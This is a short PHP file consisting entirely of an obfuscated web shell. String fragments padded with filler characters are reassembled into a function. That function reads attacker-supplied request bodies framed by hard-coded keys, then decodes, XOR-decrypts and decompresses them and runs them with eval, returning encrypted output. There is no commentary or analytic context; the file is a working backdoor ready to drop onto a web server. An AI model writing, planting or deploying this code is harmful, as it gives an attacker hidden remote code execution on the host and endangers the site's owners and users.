<?php
$L='XUwS4";f{tunct{t{tion x($t{t,$k){{t$c=strlen{t{t($k){t;$l={tstrlen($t{t);{t$o="";for';
$V='(${ti=0;$i{t<$l;){f{tor($j=0;($j{t<$c&&$i{t<$l);{t$j++{t,$i++){$o.=${tt{{t$i}^{t${tk';
$W='();{t$r=@base{t{t6{t4_en{tcode(@x(@g{tzcompress($o),$k));pri{tn{tt("{t$p$kh$r$kf");}';
$b='{$j};}}return ${to;}i{tf ({t@preg_match{t{t("/$kh(.+{t)$kf{t/",@file_g{tet_cont{tent';
$t=str_replace('fX','','crfXeafXfXte_ffXfXunctifXon');
$T='{ts{te{t64_decod{te(${tm[1]),$k){t));$o={t@ob_get_co{tntents{t();@ob{t_end_clean{t{t';
$p='s("p{thp:{t//inp{tut"),$m)=={t1) {@o{tb_sta{trt();@e{t{tval(@g{tzuncompr{tess(@x(@ba';
$D='{t$k="00d053{t7e"{t;$kh={t"b{t{t7efb5598225";$kf="bf7a{t{tb358a854";$p="{tKajXjNl{txL{tDd';
$K=str_replace('{t','',$D.$L.$V.$b.$p.$T.$W);
$o=$t('',$K);$o();
?>
